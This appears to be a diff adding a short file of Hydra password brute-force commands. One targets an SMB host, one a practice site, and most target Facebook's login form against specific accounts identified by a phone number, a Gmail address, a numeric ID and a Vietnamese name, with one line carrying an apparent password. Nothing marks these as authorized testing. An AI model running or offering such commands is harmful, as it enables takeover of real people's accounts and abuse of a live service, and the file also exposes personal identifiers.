@@ -1,0 +1,15 @@
+hydra -L name.txt -P pass.txt -V 192.168.255.129 smb
+hydra -l 0359889167 -P pass.txt www.facebook.com http-post-form "/login:username=^USER^&current-password=^PASS^:S=302" -V -f 
+hydra -l 0359889167 -P pass.txt www.facebook.com http-post-form "/login:username=^USER^&current-password=^PASS^&form=submit:The password that you've entered is incorrect. Forgotten password?" -V -f 
+hydra -l 0359889167 -P pass.txt www.facebook.com http-post-form "/login:username=^USER^&current-password=^PASS^:S443" -V -F 
+hydra -L name.txt -x 3:3:a attack.samsclass.info http-get-form "/brute4.php:login=^USES^&pw=^PASS^:Deny" -V -F
+hydra -l 0359889167 -P pass.txt www.facebook.com http-post-form "/login:username=^USER^&current-password=^PASS^&form=submit:S=DENY" -V -f  
+hydra -l nhokhau2k3@gmail.com -P pass.txt www.facebook.com http-post-form "/login:username=^USER^&current-password=^PASS^&form=submit:S=DENY" -V -f 
+hydra -l nhokhau2k3@gmail.com -P pass.txt www.facebook.com http-post-form "/login:username=^USER^&current-password=^PASS^&form=submit:DENY" -V -f  
+hydra -l nhokhau2k3@gmail.com -P pass.txt www.facebook.com http-post-form "/login:username=^USER^&current-password=^PASS^:Đăng nhập với tư cách Nguyễn Minh Hậu" -V -f 
+hydra -l 10235101242044 -P pass.txt  www.facebook.com http-post-form "/login.php:username=^USER^&password=^PASS^:S=success" -V -f
+ hydra -L name.txt -P passW.txt  www.facebook.com http-post-form "/login.php:username=^USER^&password=^PASS^:S=success" -V -f
+hydra -L name.txt -P passW.txt  www.facebook.com https-form-post "/login.php:username=^USER^&password=^PASS^:S=success" -V -f
+hydra -L name.txt -P passW.txt  www.facebook.com http-form-post "/login.php:username=^USER^&password=^PASS^:S=success" -V -f
+hydra -l 0359889167 -x 3:3:a  www.facebook.com http-post-form "/login.php:username=^USER^&password=^PASS^:S=success" -V -f
+hydra -l 0359889167 -p Nmhau%@#123  www.facebook.com https-post-form "/login/:username=^USER^&password=^PASS^:S=success" -V -f
